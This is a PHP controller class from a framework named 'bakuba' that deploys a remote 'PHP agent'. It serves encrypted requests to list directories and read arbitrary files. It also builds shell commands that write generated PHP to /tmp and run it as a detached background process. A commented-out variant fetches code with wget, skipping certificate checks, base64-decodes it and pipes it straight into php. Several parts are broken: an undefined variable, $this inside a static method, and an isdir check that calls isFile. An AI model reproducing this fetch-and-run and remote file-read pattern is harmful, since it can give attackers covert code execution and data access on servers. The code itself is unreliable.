<?php
/**
 * Copyright 2011-2026 Nicolas "DarkHack" Chapuis
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

namespace bakuba\kernel\controller;
//use bakuba\kernel\controller\CtrlPhpAgent as CtrlPhpAgent;

use bakuba\kernel\application\controller\DwControllerConnexion as DwControllerConnexion;
use bakuba\kernel\application\session\cryptoJson\DwCryptoJsonChannel as DwCryptoJsonChannel;

use bakuba\kernel\autoload\DwAutoLoad as DwAutoLoad;

use bakuba\kernel\dwNode\shAgent\DwShAgent as DwShAgent;

use bakuba\kernel\crypto\jsonPhp\DwCryptoPhp as DwCryptoPhp;

//use bakuba\kernel\crypto\json\DwJsonCrypto as DwJsonCrypto;
use bakuba\kernel\crypto\json\DwJsonEndpoint as DwJsonEndpoint;

use bakuba\kernel\session\controller\DwSessionControllerConnexion as DwSessionControllerConnexion;

class CtrlPhpAgent extends \bakuba\kernel\crypto\php\DwCryptController {
	
	public function getClassNameDwSessionChannel() : string {
		return \bakuba\kernel\crypto\php\DwSessionChannel::getStaticClassName();
	}
	
	public function cryptExecute( DwCryptoJsonChannel $dwCryptoJsonChannel ) {
		$response="echec crypt execute";
		$request = $dwCryptoJsonChannel->getData();
		$this->log->info( $request );
		
		if ( \darkphp\string\DwString::startWith2( $request, "scandir://" ) )
			$response = DwAutoLoad::scandir( substr( $request ,10 ) );
		elseif ( \darkphp\string\DwString::startWith2( $request, "isfile://" ) )
			$response = DwAutoLoad::isFile( substr( $request ,9 ) );
		elseif ( \darkphp\string\DwString::startWith2( $request, "isdir://" ) )
			$response = DwAutoLoad::isFile( substr( $request ,8 ) );
		else
			$response = "".DwAutoLoad::getFile( $request );
		
		return serialize( $response );
	}
	
	public function executeCrypt( $dwNode, $Json64message ) {
		$response = null;
		try {
			$this->log->info(".");
			$data = json_decode(  base64_decode( $Json64message ) );
			if (isset($data->status))
				$dwNode->setStatus( $data->status );
			
			if (isset($data->action)) {
				switch ( "".$data->action ) {
				case "ping" :
					$response = base64_encode( json_encode( array( "action" => "pong", "orders" => $dwNode->getOrders() ) ) );
					break;
				case "shutdown" :
					$dwNode->shutdown();
					$response = base64_encode( json_encode( array( "action" => "thanks!", "orders" => $dwNode->getOrders() ) ) );
					$response = "";
					break;
				default :
					$response = "unknow:".$data->action;
					break;
				}
			}
			else
				$response = "no action";
		} catch(Exception $err) {
			$this->log->error($err);
			throw $err;
		}
		return $response;
	}
	
	public function getClassName( bool $fqcn=null ) : string {
		return self::getStaticClassName( $fqcn );
	}
	public static function getStaticClassName( bool $fqcn=null ) : string {
		return $fqcn ? parent::getStaticClassName( $fqcn ).self::CLASS_SEPARATOR.__CLASS__ : __CLASS__;
	}
	public static function initSession(
		\bakuba\kernel\session\DwSessionManager $dwSessionManager
		,string $cmdPhp
		,DwShAgent $dwShAgent
	) : DwJsonEndpoint {
		$dwSessionManager->createSession(
				$dwHttpServiceRequest
				,\bakuba\kernel\crypto\php\DwSessionChannel::getStaticClassName()
				,new DwCallBack( array( self::getStaticClassName()."::sessionPhpInitied" ) ,$cmdPhp ,$dwShAgent )
		);
		/*
		$dwControllerConnexion = $dwSessionControllerConnexion->getDwControllerConnexion();
		
		$dwSessionIpKey = $dwControllerConnexion->getDwSessionIpKey();
		$dwSessionRequest = new \bakuba\kernel\application\session\DwSessionRequest( $dwSessionIpKey, "jsonCryptoCreate" );
		$dwSessionResponse = $dwSessionManager->jsonCryptoCreate( $dwSessionRequest );
		
		$dwCryptoJsonChannel = $dwSessionResponse->getObject();
		//self::$sLog->trace($dwCryptoJsonChannel);
		
		$dwHttpServiceRequest = $dwControllerConnexion->getDwHttpServiceRequest();
		$dwHttpRequest = $dwHttpServiceRequest->getDwHttpRequest();
		
		$jsonData = $dwCryptoJsonChannel->cryptoChannelGet( "message" );
		$jsonData->{"proto"} = $dwHttpRequest->getRqtHttps() == true ? "https" : "http";
		$jsonData->{"port"} = $dwHttpRequest->getSrvPort();
		$jsonData->{"ipaddress"} = $dwHttpRequest->getSrvIp();
		$jsonData->{"host"} = $dwHttpRequest->getRqtHost();
		$jsonData->{"ciphers"} = DwCryptoPhp::listCiphers();
		$jsonData->{"digests"} = DwCryptoPhp::listDigests();
		
		return $jsonData;
		*/
	}
	
	public static function sessionPhpInitied(
		string $cmdPhp
		,DwShAgent $dwShAgent
		,DwJsonEndpoint $dwJsonEndpoint
	) {
		echo self::getStaticClassName()."::sessionPhpInitied :".$cmdPhp.\PHP_EOL;
		$LD_LIBRARY_PATH="/lib/x86_64-linux-gnu";
		/*
		$dwHttpServiceRequest = $dwControllerConnexion->getDwHttpServiceRequest();
		$dwHttpRequest = $dwHttpServiceRequest->getDwHttpRequest();
		
		$srvURL = $dwHttpRequest->getSrvIp().":".$dwHttpRequest->getSrvPort();
		$wgetParam="--no-check-certificate -O - -q";
		$wgetParam.=" -t 1 --timeout=100 --dns-timeout=100 --connect-timeout=100 --read-timeout=100";
		$wgetParam.=" --header 'Host: bakuba.darkweb.fr'";
		$wgetParam.=" $srvURL//Starter.php?ciphers=\$ciphers64&masterPass=".$dwNode->getMasterPass();
		
		$shellRqtStart="cmdPhp=\"\$(which php)\";cmdWget=\"\$(which wget)\";";
		$shellRqtStart.="phpListSslMethode=\"<?php echo base64_encode( json_encode( openssl_get_cipher_methods() ) ); ?>\";";
		$shellRqtStart.="ciphers64=\"\$(\$cmdEcho \"\$phpListSslMethode\" | \$cmdPhp)\";";
		
		//$shellRqtRelease="$shellRqtStart\$cmdWget $wgetParam | \$cmdBase64 -d | \$cmdTee /tmp/startPhp.php | \$cmdPhp > /var/log/startPhp.log 2>&1";
		//$shellRqt="$shellRqtRelease";
		$shellRqtDebug="{$shellRqtStart}\$cmdWget $wgetParam | \$cmdBase64 -d | \$cmdTee /tmp/startPhp.php | \$cmdPhp > /var/log/startPhp.log 2>&1";
		$shellRqt="$shellRqtDebug";
		
		$shellCmd="LD_LIBRARY_PATH=\$LD_LIBRARY_PATH:$LD_LIBRARY_PATH ";
		$shellCmd.="\$cmdSh -c \"\$cmdSleep 10; $shellRqt\" 2>/var/log/start2php.log >&- <&- >/var/log/start1php.log &";
		//*/
		$cmdLibPhp="LD_LIBRARY_PATH=\$LD_LIBRARY_PATH:$LD_LIBRARY_PATH $cmdPhp";
		$shellCmd="";
		$mime_boundary="_mime_".md5(time());
		$shellCmd.="( \$(which tee) /tmp/startPhp.php <<_{$mime_boundary}\n";
		$shellCmd.=\bakuba\kernel\controller\CtrlPhpAgent::phpGenerateSrc( $dwJsonEndpoint );
		$shellCmd.="_{$mime_boundary}\n";
		$shellCmd.=") | $cmdLibPhp  >> /var/log/bakuba.log 2>&1 &\n";
		
		$dwShAgent->addOrder( \bakuba\kernel\dwNode\shAgent\DwShAgentOrder::create(
			new DwCallBack( array( &$this ,'createPhpAgent' ) )
			,$shellCmd
			,false
		) );
	}
	public function createPhpAgent( ) : void {
		$this->log->trace(".");
	}
	public static function phpGenerateSrc( DwJsonEndpoint $jsonData ) : string {
		$phpSrc="<?php\r\n";
		foreach( array(
			/*
//			"dwEncoding/Encoding.php"
//			,"dwAutoLoad/DwSource.php"
//			,"dwAutoLoad/DwNameSpace.php"
			,"dwLogger/DwCltLogger.php"
			,"dwLogger/DwEchoLoggerAsLogger.php"
			//*/
			"serializable/iDwSerializable.php"
			,"serializable/DwSerializable.php"
			,"serializable/json/iDwJson.php"
			,"serializable/json/DwJson.php"
			,"crypto/json/DwJsonCrypto.php"
			,"object/DwObject.php"
			,"object/DwCallBack.php"
			
			,"application/session/DwSessionChannel.php"
			,"crypto/json/DwJsonEndpoint.php"
			,"crypto/php/DwCrypto.php"
			,"crypto/php/DwSessionChannel.php"
			,"dwCrypto/DwJsonCryptControllerClient.php"
			
			,"dwAutoLoad/IDwAutoLoad.php"
			,"dwAutoLoad/DwAutoLoadBoot.php"
			,"dwAutoLoad/DwAutoLoadCltInit.php"
			,"dwAutoLoad/DwAutoLoadClt.php"
			,"dwBakuba/DwInstall.php"
		) as $srcFile ) {
			//;
			$phpSrc.="require_once( \"data://text/plain,".urlencode( \bakuba\kernel\autoload\DwAutoLoad::getFile( "file://bakuba/kernel/".$srcFile ) )."\" );\r\n";
			//$phpSrc.="require_once( \"data://text/plain;base64,".base64_encode( \bakuba\kernel\autoload\DwAutoLoad::getFile( "file://bakuba/kernel/".$srcFile ) )."\" );\r\n";
		}
		$phpSrc.="bakuba\kernel\agartha\DwInstall::singleton(";
		$phpSrc.="bakuba\kernel\autoload\DwAutoLoadClt::singleton(";
		$phpSrc.=" bakuba\kernel\autoload\DwAutoLoadCltInit::singleton( '".$jsonData->serialize()."' )";
		$phpSrc.=")";
		$phpSrc.=");";
		$phpSrc.="?>\r\n";
		return $phpSrc;
	}
}
